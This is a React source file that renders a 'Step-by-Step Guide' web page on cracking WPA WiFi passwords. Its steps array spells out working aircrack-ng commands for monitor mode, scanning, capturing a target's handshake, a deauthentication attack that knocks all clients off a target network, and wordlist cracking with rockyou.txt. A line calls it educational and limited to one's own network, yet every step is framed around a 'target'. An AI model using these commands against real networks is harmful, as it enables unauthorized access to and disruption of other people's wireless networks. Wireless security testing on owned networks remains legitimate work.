
import React from 'react';
import { 
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger
} from "@/components/ui/accordion";
import CodeBlock from './CodeBlock';

const StepByStepGuide = () => {
  const steps = [
    {
      id: "step-1",
      title: "Setting up your WiFi adapter in monitor mode",
      description: "First, we need to set up our WiFi adapter to monitor wireless traffic",
      code: "# Check your wireless interfaces\niwconfig\n\n# Kill processes that might interfere\nsudo airmon-ng check kill\n\n# Start monitor mode\nsudo airmon-ng start wlan0"
    },
    {
      id: "step-2",
      title: "Scanning for nearby networks",
      description: "Now we'll scan for all nearby WiFi networks to find our target",
      code: "# Scan for networks\nsudo airodump-ng wlan0mon"
    },
    {
      id: "step-3",
      title: "Capturing handshake packets",
      description: "We need to capture the WPA handshake from our target network",
      code: "# Target specific network (replace with your target info)\nsudo airodump-ng -c [channel] --bssid [target MAC] -w capture wlan0mon"
    },
    {
      id: "step-4",
      title: "Deauthentication attack to force handshake",
      description: "Send deauth packets to force clients to reconnect and capture handshake",
      code: "# Deauth all devices on target network\nsudo aireplay-ng -0 5 -a [target MAC] wlan0mon"
    },
    {
      id: "step-5",
      title: "Cracking the captured handshake",
      description: "Finally, attempt to crack the password using the captured handshake",
      code: "# Crack with wordlist\nsudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [target MAC] capture*.cap"
    }
  ];

  return (
    <section id="steps" className="py-20">
      <div className="section-container">
        <div className="text-center mb-12">
          <h2 className="text-3xl md:text-4xl font-mono font-bold mb-4">
            Step-by-Step Guide
          </h2>
          <p className="text-gray-300 max-w-2xl mx-auto">
            Follow these steps carefully for educational purposes on your own network.
          </p>
          <div className="w-24 h-1 bg-hack-green mx-auto mt-4"></div>
        </div>
        
        <div className="max-w-3xl mx-auto">
          <Accordion type="single" collapsible className="space-y-4">
            {steps.map((step) => (
              <AccordionItem 
                key={step.id} 
                value={step.id}
                className="border border-hack-gray rounded-md overflow-hidden bg-hack-gray/50"
              >
                <AccordionTrigger className="px-4 py-3 font-mono hover:no-underline hover:bg-hack-gray/80">
                  <div className="flex items-center">
                    <div className="bg-hack-green text-hack-dark w-8 h-8 rounded-full flex items-center justify-center mr-3 flex-shrink-0 font-bold">
                      {step.id.split('-')[1]}
                    </div>
                    <span>{step.title}</span>
                  </div>
                </AccordionTrigger>
                <AccordionContent className="px-4 pb-4">
                  <p className="text-gray-300 mb-4">{step.description}</p>
                  <CodeBlock code={step.code} />
                </AccordionContent>
              </AccordionItem>
            ))}
          </Accordion>
        </div>
      </div>
    </section>
  );
};

export default StepByStepGuide;
